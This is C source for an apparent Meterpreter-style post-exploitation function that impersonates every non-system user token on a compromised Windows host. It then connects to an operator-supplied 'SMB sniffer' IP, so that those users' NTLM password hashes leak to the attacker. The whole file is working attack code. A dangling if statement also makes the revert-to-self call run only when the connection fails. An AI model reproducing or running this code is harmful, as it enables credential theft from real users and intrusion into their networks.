#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include "token_info.h"
#include "list_tokens.h"
#include "incognito.h"

// Send off hashes for all tokens to IP address with SMB sniffer running
DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
{
	DWORD num_tokens = 0, i;
	SavedToken *token_list = NULL;
	NETRESOURCE nr;
	HANDLE saved_token;
	char conn_string[BUF_SIZE] = "", domain_name[BUF_SIZE] = "", *smb_sniffer_ip = NULL,
		return_value[BUF_SIZE] = "", temp[BUF_SIZE] = "";

	Packet *response = packet_create_response(packet);
	smb_sniffer_ip = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);

	// Initialise net_resource structure (essentially just set ip to that of smb_sniffer)
   	if (_snprintf(conn_string, sizeof(conn_string), "\\\\%s", smb_sniffer_ip) == -1)
		conn_string[sizeof(conn_string)-1] = '\0';
	nr.dwType    		 = RESOURCETYPE_ANY;
   	nr.lpLocalName       = NULL;
   	nr.lpProvider        = NULL;
   	nr.lpRemoteName 	 = (LPSTR)conn_string;

	// Save current thread token if one is currently being impersonated
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &saved_token))
		saved_token = INVALID_HANDLE_VALUE;

	token_list = get_token_list(&num_tokens);
	if (!token_list)
	{
		packet_transmit_response(GetLastError(), remote, response);
		goto cleanup;
	}

	// Use every token and get hashes by connecting to SMB sniffer
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		get_domain_from_token(token_list[i].token, domain_name);
		// If token is not "useless" local account connect to sniffer
		if (_stricmp(domain_name, "NT AUTHORITY"))
		{
			// Impersonate token
			ImpersonateLoggedOnUser(token_list[i].token);
			
			// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
			WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
			
			// Connect to smb sniffer
			if (!WNetAddConnection2A(&nr, NULL, NULL, 0))

			// Revert to primary token
			RevertToSelf();
		}
		CloseHandle(token_list[i].token);
	}

	packet_transmit_response(ERROR_SUCCESS, remote, response);

cleanup:
	free(token_list);

	// Restore token impersonation
	if (saved_token != INVALID_HANDLE_VALUE)
		ImpersonateLoggedOnUser(saved_token);

	return ERROR_SUCCESS;
}